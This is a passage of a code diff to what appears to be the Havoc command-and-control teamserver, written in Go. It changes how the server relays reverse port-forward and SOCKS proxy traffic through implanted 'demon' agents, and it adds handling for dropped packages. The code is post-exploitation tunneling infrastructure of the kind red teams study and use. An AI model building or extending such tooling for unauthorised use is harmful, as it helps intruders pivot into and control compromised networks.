+									a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to open reverse port forward host: %v", err), "")
 										return
 									}
+								}
 
-								} else {
+								/* write the data to the forwarded host */
+								err = a.PortFwdWrite(SocktID, Data)
+								if err != nil {
+									a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to reverse port forward socket 0x%08x: %v", SocktID, err), "")
+									return
+								}
 
-									logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
+								if opened == false {
+									/* after we managed to open a socket to the forwarded host lets start a
+									 * goroutine where we read the data from the forwarded host and send it to the agent. */
+									go func() {
 
+										for {
+
+											Data, err := a.PortFwdRead(SocktID)
+											if err == nil {
+
+												/* only send the data if there is something... */
+												if len(Data) > 0 {
+
+													/* make a new job */
+													var job = Job{
+														Command: COMMAND_SOCKET,
+														Data: []any{
+															SOCKET_COMMAND_WRITE,
+															SocktID,
+															Data,
+														},
+													}
+
+													/* append the job to the task queue */
+													a.AddJobToQueue(job)
+
+												}
+
+											} else {
+												/* we failed to read from the portfwd */
+												logger.Error(fmt.Sprintf("Failed to read from socket %08x: %v", SocktID, err))
+												return
+											}
+										}
+
+									}()
 								}
 
 							} else if Type == SOCKET_TYPE_REVERSE_PROXY {
 
 								/* check if there is a socket with that socks proxy id */
-								if Socket := a.SocksClientGet(Id); Socket != nil {
+								if Socket := a.SocksClientGet(SocktID); Socket != nil {
 
 									/* write the data to socks proxy */
 									_, err := Socket.Conn.Write(Data)
 									if err != nil {
-										a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to socks proxy %v: %v", Id, err), "")
+										a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to socks proxy %v: %v", SocktID, err), "")
 
 										/* TODO: remove socks proxy client */
 										//a.SocksClientClose(SOCKET_TYPE_CLIENT)
@@ -5693,25 +5916,25 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 									}
 
 								} else {
-									logger.Error(fmt.Sprintf("Socket id not found: %x\n", Id))
+									logger.Error(fmt.Sprintf("SocketID not found: %08x\n", SocktID))
 								}
 							}
 						} else {
-							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ,    Invalid packet", AgentID))
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, Invalid packet", AgentID))
 						}
 					} else {
 						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 							var (
 								ErrorCode = Parser.ParseInt32()
 							)
-							logger.Warn(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ,    Id: %08x, Type: %d, Failed with: %d", AgentID, Id, Type, ErrorCode))
-							a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to read from socks target %v: %v", Id, ErrorCode), "")
+							logger.Warn(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, SocktID: %08x, Type: %d, Failed with: %d", AgentID, SocktID, Type, ErrorCode))
+							a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to read from socks target %v: %v", SocktID, ErrorCode), "")
 						} else {
-							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ,    Invalid packet", AgentID))
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, Invalid packet", AgentID))
 						}
 					}
 				} else {
-					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ,    Invalid packet", AgentID))
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, Invalid packet", AgentID))
 				}
 
 				break
@@ -5748,38 +5971,19 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					var (
 						SockId = Parser.ParseInt32()
 						Type   = Parser.ParseInt32()
-						Socket *PortFwd
 					)
 
 					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CLOSE,   Id: %08x, Type: %d", AgentID, SockId, Type))
 
-					/* NOTE: for now the reverse port forward close command is not used. */
-					if Type == SOCKET_TYPE_REVERSE_PORTFWD || Type == SOCKET_TYPE_CLIENT {
+					if Type == SOCKET_TYPE_REVERSE_PROXY {
 
-						/* check if there is a socket with that portfwd id */
-						if Socket = a.PortFwdGet(SockId); Socket != nil {
-
-							/* Based on the type of the socket tell the operator
-							 * for example SOCKET_TYPE_CLIENT is something we can ignore.
-							 * But if it's a SOCKET_TYPE_REVERSE_PORTFWD then let the operator know. */
-							if Type == SOCKET_TYPE_REVERSE_PORTFWD {
-								var LclString = common.Int32ToIpString(int64(Socket.LclAddr))
-								a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("Closed reverse port forward [Id: %x] [Bind %s:%d] [Forward: %s]", Socket.SocktID, LclString, Socket.LclPort, Socket.Target), "")
-							}
-
-							/* finally close our port forwarder */
-							a.PortFwdClose(SockId)
+						/* lets remove it */
+						if a.SocksClientClose(int32(SockId)) == false {
+							logger.Error(fmt.Sprintf("SockId not found: %08x", SockId))
 						}
 
-					} else if Type == SOCKET_TYPE_REVERSE_PROXY {
-
-						if Client := a.SocksClientGet(SockId); Client != nil {
-
-							/* lets remove it */
-							a.SocksClientClose(int32(SockId))
-
-						}
-
+					} else {
+						logger.Error(fmt.Sprintf("Invalid socket type: %d", Type))
 					}
 				} else {
 					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CLOSE, Invalid packet", AgentID))
@@ -5802,7 +6006,8 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						if Success == win32.TRUE {
 							// succeeded
 
-							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Id: %08x, Type: %d, Success: %d", AgentID, SocketId, SOCKET_TYPE_REVERSE_PROXY, Success))
+							// avoid too much spam
+							//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_CONNECT, Id: %08x, Type: %d, Success: %d", AgentID, SocketId, SOCKET_TYPE_REVERSE_PROXY, Success))
 
 							err := socks.SendConnectSuccess(Client.Conn, Client.ATYP, Client.IpDomain, Client.Port)
 							if err == nil {
@@ -6181,6 +6386,35 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 		} else {
 			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_MEM_FILE, Invalid packet", AgentID))
 		}
+
+		break;
+
+	case COMMAND_PACKAGE_DROPPED:
+		var (
+			Message    map[string]string
+		)
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+			var (
+				PkgLength = Parser.ParseInt32()
+				MaxLength = Parser.ParseInt32()
+			)
+
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PACKAGE_DROPPED, PkgLength: 0x%x, MaxLength: 0x%x", AgentID, PkgLength, MaxLength))
+
+			Message = map[string]string{
+				"Type":    "Erro",
+				"Message": "A package was discarded by demon for being larger than PIPE_BUFFER_MAX",
+			}
+
+			// a single command can generate multiple dropped packages
+			//a.RequestCompleted(RequestID)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PACKAGE_DROPPED, Invalid packet", AgentID))
+		}
+
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+
+		break;
 
 	default:
 		logger.Debug(fmt.Sprintf("Agent: %x, Command: UNKNOWN (%d))", AgentID, CommandID))
